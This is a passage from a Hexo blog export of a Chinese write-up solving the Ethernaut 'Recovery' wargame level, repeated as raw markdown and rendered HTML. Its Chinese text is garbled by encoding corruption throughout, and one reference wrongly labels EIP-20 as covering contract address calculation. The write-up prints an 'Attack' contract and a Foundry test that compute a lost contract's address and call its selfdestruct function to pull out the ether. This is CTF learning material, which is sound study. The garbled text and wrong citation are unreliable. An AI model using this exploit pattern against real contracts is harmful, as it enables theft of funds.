å·¥å‚åˆçº¦åœ¨åˆ›å»ºæ–°åˆçº¦æ—¶ï¼Œåº”è¯¥æ€»æ˜¯è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œæˆ–è€…è§¦å‘ä¸€ä¸ªåŒ…å«è¯¥åœ°å€çš„äº‹ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) {\n        SimpleToken token = new SimpleToken(_name, _initialSupply);\n        token.transfer(msg.sender, msg.value);\n        emit TokenCreated(address(token)); // è§¦å‘äº‹ä»¶\n        return address(token); // è¿”å›åœ°å€\n    }\n    ```\n\n2.  **ä½¿ç”¨ `CREATE2`**: å¦‚æœéœ€è¦æ›´å¼ºçš„åœ°å€ç¡®å®šæ€§ï¼ˆä¾‹å¦‚ï¼Œåœ¨åˆçº¦éƒ¨ç½²å‰å°±ä¸å…¶äº¤äº’ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ `CREATE2` æ“ä½œç ã€‚`CREATE2` å…è®¸æ ¹æ®éƒ¨ç½²è€…åœ°å€ã€ä¸€ä¸ª `salt` å€¼å’Œåˆçº¦çš„åˆå§‹åŒ–ä»£ç æ¥é¢„è®¡ç®—åœ°å€ï¼Œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **åœ°å€ç¡®å®šæ€§è®¡ç®—**: ç†è§£åˆçº¦åœ°å€æ˜¯å¦‚ä½•ä»éƒ¨ç½²è€…åœ°å€å’Œ `nonce` ç”Ÿæˆçš„ï¼Œæ˜¯EVMçš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚\n-   **RLP (Recursive-Length Prefix)**: ä»¥å¤ªåŠç”¨äºåºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦ç¼–ç æ–¹æ³•ã€‚è™½ç„¶åœ¨é«˜çº§Solidityç¼–ç¨‹ä¸­ä¸å¸¸ç›´æ¥ä½¿ç”¨ï¼Œä½†ç†è§£å…¶åŸºæœ¬åŸç†æœ‰åŠ©äºæ·±å…¥äº†è§£EVMçš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚\n-   **`keccak256`**: ä»¥å¤ªåŠä¸­æ— å¤„ä¸åœ¨çš„å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºåœ°å€ç”Ÿæˆã€å‡½æ•°ç­¾åã€æ•°æ®æ ¡éªŒç­‰å¤šç§åœºæ™¯ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—ã€‚\n-   åœ°å€çš„è®¡ç®—ä¾èµ–äºéƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ `nonce`ã€‚\n-   RLPç¼–ç æ˜¯ä»¥å¤ªåŠåºåˆ—åŒ–æ•°æ®çš„åŸºç¡€ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   å½“å·¥å‚åˆçº¦æ²¡æœ‰è¿”å›æˆ–è®°å½•å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é“¾ä¸Šæ•°æ®ï¼ˆéƒ¨ç½²è€…åœ°å€å’Œ `nonce`ï¼‰è‡ªè¡Œè®¡ç®—å‡ºè¯¥åœ°å€ã€‚\n-   ä¸€æ—¦æ‰¾åˆ°åœ°å€ï¼Œå°±å¯ä»¥ä¸è¯¥åˆçº¦è¿›è¡Œäº¤äº’ï¼Œåˆ©ç”¨å…¶å†…éƒ¨çš„ä»»ä½•å‡½æ•°ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ `destroy`ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å·¥å‚åˆçº¦åº”å§‹ç»ˆé€šè¿‡è¿”å›å€¼æˆ–äº‹ä»¶æ¥æš´éœ²å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€ã€‚\n-   åœ¨è®¾è®¡åˆçº¦æ—¶ï¼Œéµå¾ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µï¼Œç¡®ä¿æ‰€æœ‰é‡è¦çš„ä¿¡æ¯éƒ½æ˜¯å¯è®¿é—®çš„ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EIP-20: Contract Address Calculation](https://eips.ethereum.org/EIPS/eip-20)\n-   [Ethereum Docs: RLP (Recursive-Length Prefix)](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)\n-   [StackExchange: How is an Ethereum address created?](https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created)","source":"_posts/ethernaut-level-17-recovery.md","raw":"---\ntitle: 'Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€'\ndate: 2025-01-25 16:30:00\nupdated: 2025-01-25 16:30:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Contract Address Prediction\n  - RLP\n  - keccak256\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"å­¦ä¹ å¦‚ä½•åŸºäºéƒ¨ç½²è€…åœ°å€å’Œ nonce ç¡®å®šæ€§åœ°è®¡ç®—æœªæ¥åˆçº¦çš„åœ°å€ã€‚æ·±å…¥ç†è§£ä»¥å¤ªåŠçš„ RLP ç¼–ç è§„åˆ™å’Œ `keccak256` å“ˆå¸Œåœ¨åœ°å€ç”Ÿæˆä¸­çš„ä½œç”¨ï¼ŒæŒæ¡ Recovery å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 17 - Recovery](https://ethernaut.openzeppelin.com/level/17)  \n> **æ”»å‡»ç±»å‹**: åˆçº¦åœ°å€é¢„æµ‹  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n`Recovery` åˆçº¦é€šè¿‡ `generateToken` å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª `SimpleToken` åˆçº¦å®ä¾‹ï¼Œå¹¶å‘å…¶å‘é€äº† 0.001 etherã€‚ä½†æ˜¯ï¼Œ`generateToken` å‡½æ•°æ²¡æœ‰è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ã€‚ä½ çš„ç›®æ ‡æ˜¯å–å›è¿™ 0.001 etherã€‚\n\n![Recovery Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`SimpleToken` åˆçº¦ä¸­æœ‰ä¸€ä¸ª `destroy` å‡½æ•°ï¼Œå¯ä»¥é”€æ¯åˆçº¦å¹¶å°†ä½™é¢å‘é€åˆ°æŒ‡å®šåœ°å€ã€‚å› æ­¤ï¼Œæœ¬å…³çš„æ ¸å¿ƒæŒ‘æˆ˜åœ¨äºæ‰¾åˆ°è¿™ä¸ªä¸¢å¤±çš„ `SimpleToken` åˆçº¦çš„åœ°å€ã€‚\n\n```solidity\ncontract SimpleToken {\n    // ...\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n```\n\nåœ¨ä»¥å¤ªåŠä¸­ï¼Œåˆçº¦çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®éƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ `nonce` ç¡®å®šæ€§åœ°è®¡ç®—å‡ºæ¥çš„ã€‚å…¶è®¡ç®—å…¬å¼ä¸ºï¼š\n\n`new_address = keccak256(rlp([sender_address, nonce]))`\n\n-   `sender_address`: åˆ›å»ºåˆçº¦çš„è´¦æˆ·åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯ `Recovery` åˆçº¦çš„åœ°å€ã€‚\n-   `nonce`: åˆ›å»ºè€…è´¦æˆ·çš„ `nonce`ã€‚å¯¹äºEOAï¼Œ`nonce` æ˜¯å…¶å‘é€çš„äº¤æ˜“æ•°é‡ã€‚å¯¹äºåˆçº¦ï¼Œ`nonce` æ˜¯å®ƒåˆ›å»ºçš„åˆçº¦æ•°é‡ã€‚ç”±äº `Recovery` åˆçº¦æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»º `SimpleToken`ï¼Œæ‰€ä»¥å®ƒçš„ `nonce` æ˜¯1ã€‚\n-   `rlp([...])`: å¯¹å‘é€è€…åœ°å€å’Œ `nonce` è¿›è¡ŒRLPï¼ˆRecursive-Length Prefixï¼‰ç¼–ç ã€‚\n\n### RLP ç¼–ç \n\nRLPç¼–ç è§„åˆ™æ¯”è¾ƒå¤æ‚ï¼Œä½†å¯¹äº `[address, nonce]` è¿™ç§åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€åŒ–å…¶åœ¨Solidityä¸­çš„æ„é€ ï¼š\n\n`abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))`\n\n-   `0xd6`: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ªé•¿åº¦åœ¨0-55å­—èŠ‚ä¹‹é—´çš„åˆ—è¡¨ï¼ˆlistï¼‰ã€‚\n-   `0x94`: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ª20å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ï¼Œå³åœ°å€ã€‚\n-   `sender_address`: 20å­—èŠ‚çš„éƒ¨ç½²è€…åœ°å€ã€‚\n-   `0x01`: `nonce` ä¸º1çš„RLPç¼–ç ã€‚\n\nå°†è¿™äº›éƒ¨åˆ†æ‰“åŒ…å¹¶è¿›è¡Œ `keccak256` å“ˆå¸Œï¼Œç„¶åå–ç»“æœçš„å20å­—èŠ‚ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚\n\n### åœ¨Solidityä¸­è®¡ç®—åœ°å€\n\næˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªè®¡ç®—ï¼š\n\n```solidity\nfunction calculateAddress(address _deployerAddress) public pure returns (address) {\n    uint nonce = 1; // è¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦\n    return address(\n        uint160(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        bytes1(0xd6),\n                        bytes1(0x94),\n                        _deployerAddress,\n                        bytes1(nonce)\n                    )\n                )\n            )\n        )\n    );\n}\n```\n\nä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡º `SimpleToken` çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨å®ƒçš„ `destroy` å‡½æ•°æ¥å–å›ä»¥å¤ªå¸ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦/é€»è¾‘\n\næˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª `Attack` åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå‡½æ•°æ¥ä¸ºæˆ‘ä»¬è®¡ç®—ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        // nonce æ˜¯ 1ï¼Œå› ä¸ºè¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦\n        bytes1 nonce = bytes1(0x01);\n\n        address lostContractAddress = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            bytes1(0xd6),       // RLP prefix for a list\n                            bytes1(0x94),       // RLP prefix for a 20-byte string\n                            _deployerAddress,   // The deployer's address\n                            nonce             // The nonce\n                        )\n                    )\n                )\n            )\n        );\n\n        return lostContractAddress;\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/17_Recovery.sol\";\n\n// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        bytes1 nonce = bytes1(0x01);\n        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));\n        return lostContractAddress;\n    }\n}\n\ncontract RecoveryTest is Test {\n    Recovery recoveryInstance;\n    Attack attack;\n    address payable player;\n\n    function setUp() public {\n        player = payable(vm.addr(1));\n        \n        // éƒ¨ç½² Recovery åˆçº¦å¹¶è®©å®ƒåˆ›å»ºä¸€ä¸ª SimpleToken\n        vm.deal(address(this), 0.001 ether);\n        recoveryInstance = new Recovery();\n        recoveryInstance.generateToken{value: 0.001 ether}(\"MyToken\", 100);\n\n        attack = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // æ­¥éª¤ 1: è®¡ç®—ä¸¢å¤±çš„ SimpleToken åˆçº¦åœ°å€\n        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));\n\n        // éªŒè¯ä½™é¢æ˜¯å¦æ­£ç¡®\n        assertEq(lostContract.balance, 0.001 ether);\n\n        // æ­¥éª¤ 2: è°ƒç”¨ destroy å‡½æ•°å–å›èµ„é‡‘\n        SimpleToken(lostContract).destroy(player);\n\n        // éªŒè¯èµ„é‡‘æ˜¯å¦å·²å–å›\n        assertEq(lostContract.balance, 0);\n        // æ³¨æ„: player çš„æœ€ç»ˆä½™é¢ä¼šç•¥ä½äºåˆå§‹å€¼ï¼Œå› ä¸ºæœ‰ gas æ¶ˆè€—\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è·å–éƒ¨ç½²è€…åœ°å€**: ç¡®å®šåˆ›å»º `SimpleToken` çš„åˆçº¦åœ°å€ï¼Œå³ `Recovery` åˆçº¦çš„åœ°å€ã€‚\n2.  **è®¡ç®—åˆçº¦åœ°å€**: ä½¿ç”¨ `keccak256(rlp([deployer_address, nonce]))` å…¬å¼è®¡ç®—å‡º `SimpleToken` çš„åœ°å€ã€‚`nonce` ä¸º1ã€‚\n3.  **è°ƒç”¨ `destroy`**: è·å– `SimpleToken` åˆçº¦çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶ `destroy` å‡½æ•°ï¼Œå°†èµ„é‡‘è½¬ç§»åˆ° `player` åœ°å€ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **è¿”å›åˆ›å»ºçš„åˆçº¦åœ°å€**: å·¥å‚åˆçº¦åœ¨åˆ›å»ºæ–°åˆçº¦æ—¶ï¼Œåº”è¯¥æ€»æ˜¯è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œæˆ–è€…è§¦å‘ä¸€ä¸ªåŒ…å«è¯¥åœ°å€çš„äº‹ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®\n    function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) {\n        SimpleToken token = new SimpleToken(_name, _initialSupply);\n        token.transfer(msg.sender, msg.value);\n        emit TokenCreated(address(token)); // è§¦å‘äº‹ä»¶\n        return address(token); // è¿”å›åœ°å€\n    }\n    ```\n\n2.  **ä½¿ç”¨ `CREATE2`**: å¦‚æœéœ€è¦æ›´å¼ºçš„åœ°å€ç¡®å®šæ€§ï¼ˆä¾‹å¦‚ï¼Œåœ¨åˆçº¦éƒ¨ç½²å‰å°±ä¸å…¶äº¤äº’ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ `CREATE2` æ“ä½œç ã€‚`CREATE2` å…è®¸æ ¹æ®éƒ¨ç½²è€…åœ°å€ã€ä¸€ä¸ª `salt` å€¼å’Œåˆçº¦çš„åˆå§‹åŒ–ä»£ç æ¥é¢„è®¡ç®—åœ°å€ï¼Œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **åœ°å€ç¡®å®šæ€§è®¡ç®—**: ç†è§£åˆçº¦åœ°å€æ˜¯å¦‚ä½•ä»éƒ¨ç½²è€…åœ°å€å’Œ `nonce` ç”Ÿæˆçš„ï¼Œæ˜¯EVMçš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚\n-   **RLP (Recursive-Length Prefix)**: ä»¥å¤ªåŠç”¨äºåºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦ç¼–ç æ–¹æ³•ã€‚è™½ç„¶åœ¨é«˜çº§Solidityç¼–ç¨‹ä¸­ä¸å¸¸ç›´æ¥ä½¿ç”¨ï¼Œä½†ç†è§£å…¶åŸºæœ¬åŸç†æœ‰åŠ©äºæ·±å…¥äº†è§£EVMçš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚\n-   **`keccak256`**: ä»¥å¤ªåŠä¸­æ— å¤„ä¸åœ¨çš„å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºåœ°å€ç”Ÿæˆã€å‡½æ•°ç­¾åã€æ•°æ®æ ¡éªŒç­‰å¤šç§åœºæ™¯ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—ã€‚\n-   åœ°å€çš„è®¡ç®—ä¾èµ–äºéƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ `nonce`ã€‚\n-   RLPç¼–ç æ˜¯ä»¥å¤ªåŠåºåˆ—åŒ–æ•°æ®çš„åŸºç¡€ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   å½“å·¥å‚åˆçº¦æ²¡æœ‰è¿”å›æˆ–è®°å½•å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é“¾ä¸Šæ•°æ®ï¼ˆéƒ¨ç½²è€…åœ°å€å’Œ `nonce`ï¼‰è‡ªè¡Œè®¡ç®—å‡ºè¯¥åœ°å€ã€‚\n-   ä¸€æ—¦æ‰¾åˆ°åœ°å€ï¼Œå°±å¯ä»¥ä¸è¯¥åˆçº¦è¿›è¡Œäº¤äº’ï¼Œåˆ©ç”¨å…¶å†…éƒ¨çš„ä»»ä½•å‡½æ•°ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ `destroy`ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å·¥å‚åˆçº¦åº”å§‹ç»ˆé€šè¿‡è¿”å›å€¼æˆ–äº‹ä»¶æ¥æš´éœ²å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€ã€‚\n-   åœ¨è®¾è®¡åˆçº¦æ—¶ï¼Œéµå¾ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µï¼Œç¡®ä¿æ‰€æœ‰é‡è¦çš„ä¿¡æ¯éƒ½æ˜¯å¯è®¿é—®çš„ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EIP-20: Contract Address Calculation](https://eips.ethereum.org/EIPS/eip-20)\n-   [Ethereum Docs: RLP (Recursive-Length Prefix)](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)\n-   [StackExchange: How is an Ethereum address created?](https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created)","slug":"ethernaut-level-17-recovery","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpf0019bf5q7d96c2bo","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-17-Recovery-é¢„æµ‹åˆçº¦åœ°å€\"><a href=\"#ğŸ¯-Ethernaut-Level-17-Recovery-é¢„æµ‹åˆçº¦åœ°å€\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€\"></a>ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/17\">Ethernaut Level 17 - Recovery</a><br><strong>æ”»å‡»ç±»å‹</strong>: åˆçº¦åœ°å€é¢„æµ‹<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p><code>Recovery</code> åˆçº¦é€šè¿‡ <code>generateToken</code> å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª <code>SimpleToken</code> åˆçº¦å®ä¾‹ï¼Œå¹¶å‘å…¶å‘é€äº† 0.001 etherã€‚ä½†æ˜¯ï¼Œ<code>generateToken</code> å‡½æ•°æ²¡æœ‰è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ã€‚ä½ çš„ç›®æ ‡æ˜¯å–å›è¿™ 0.001 etherã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg\" alt=\"Recovery Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>SimpleToken</code> åˆçº¦ä¸­æœ‰ä¸€ä¸ª <code>destroy</code> å‡½æ•°ï¼Œå¯ä»¥é”€æ¯åˆçº¦å¹¶å°†ä½™é¢å‘é€åˆ°æŒ‡å®šåœ°å€ã€‚å› æ­¤ï¼Œæœ¬å…³çš„æ ¸å¿ƒæŒ‘æˆ˜åœ¨äºæ‰¾åˆ°è¿™ä¸ªä¸¢å¤±çš„ <code>SimpleToken</code> åˆçº¦çš„åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SimpleToken &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    function destroy(address payable _to) public &#123;</span><br><span class=\"line\">        selfdestruct(_to);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ä»¥å¤ªåŠä¸­ï¼Œåˆçº¦çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®éƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ <code>nonce</code> ç¡®å®šæ€§åœ°è®¡ç®—å‡ºæ¥çš„ã€‚å…¶è®¡ç®—å…¬å¼ä¸ºï¼š</p>\n<p><code>new_address = keccak256(rlp([sender_address, nonce]))</code></p>\n<ul>\n<li><code>sender_address</code>: åˆ›å»ºåˆçº¦çš„è´¦æˆ·åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯ <code>Recovery</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><code>nonce</code>: åˆ›å»ºè€…è´¦æˆ·çš„ <code>nonce</code>ã€‚å¯¹äºEOAï¼Œ<code>nonce</code> æ˜¯å…¶å‘é€çš„äº¤æ˜“æ•°é‡ã€‚å¯¹äºåˆçº¦ï¼Œ<code>nonce</code> æ˜¯å®ƒåˆ›å»ºçš„åˆçº¦æ•°é‡ã€‚ç”±äº <code>Recovery</code> åˆçº¦æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»º <code>SimpleToken</code>ï¼Œæ‰€ä»¥å®ƒçš„ <code>nonce</code> æ˜¯1ã€‚</li>\n<li><code>rlp([...])</code>: å¯¹å‘é€è€…åœ°å€å’Œ <code>nonce</code> è¿›è¡ŒRLPï¼ˆRecursive-Length Prefixï¼‰ç¼–ç ã€‚</li>\n</ul>\n<h3 id=\"RLP-ç¼–ç \"><a href=\"#RLP-ç¼–ç \" class=\"headerlink\" title=\"RLP ç¼–ç \"></a>RLP ç¼–ç </h3><p>RLPç¼–ç è§„åˆ™æ¯”è¾ƒå¤æ‚ï¼Œä½†å¯¹äº <code>[address, nonce]</code> è¿™ç§åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€åŒ–å…¶åœ¨Solidityä¸­çš„æ„é€ ï¼š</p>\n<p><code>abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))</code></p>\n<ul>\n<li><code>0xd6</code>: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ªé•¿åº¦åœ¨0-55å­—èŠ‚ä¹‹é—´çš„åˆ—è¡¨ï¼ˆlistï¼‰ã€‚</li>\n<li><code>0x94</code>: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ª20å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ï¼Œå³åœ°å€ã€‚</li>\n<li><code>sender_address</code>: 20å­—èŠ‚çš„éƒ¨ç½²è€…åœ°å€ã€‚</li>\n<li><code>0x01</code>: <code>nonce</code> ä¸º1çš„RLPç¼–ç ã€‚</li>\n</ul>\n<p>å°†è¿™äº›éƒ¨åˆ†æ‰“åŒ…å¹¶è¿›è¡Œ <code>keccak256</code> å“ˆå¸Œï¼Œç„¶åå–ç»“æœçš„å20å­—èŠ‚ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚</p>\n<h3 id=\"åœ¨Solidityä¸­è®¡ç®—åœ°å€\"><a href=\"#åœ¨Solidityä¸­è®¡ç®—åœ°å€\" class=\"headerlink\" title=\"åœ¨Solidityä¸­è®¡ç®—åœ°å€\"></a>åœ¨Solidityä¸­è®¡ç®—åœ°å€</h3><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªè®¡ç®—ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateAddress(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">    uint nonce = 1; // è¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦</span><br><span class=\"line\">    return address(</span><br><span class=\"line\">        uint160(</span><br><span class=\"line\">            uint256(</span><br><span class=\"line\">                keccak256(</span><br><span class=\"line\">                    abi.encodePacked(</span><br><span class=\"line\">                        bytes1(0xd6),</span><br><span class=\"line\">                        bytes1(0x94),</span><br><span class=\"line\">                        _deployerAddress,</span><br><span class=\"line\">                        bytes1(nonce)</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡º <code>SimpleToken</code> çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨å®ƒçš„ <code>destroy</code> å‡½æ•°æ¥å–å›ä»¥å¤ªå¸ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦-é€»è¾‘\"><a href=\"#æ”»å‡»åˆçº¦-é€»è¾‘\" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦&#x2F;é€»è¾‘\"></a>æ”»å‡»åˆçº¦&#x2F;é€»è¾‘</h3><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª <code>Attack</code> 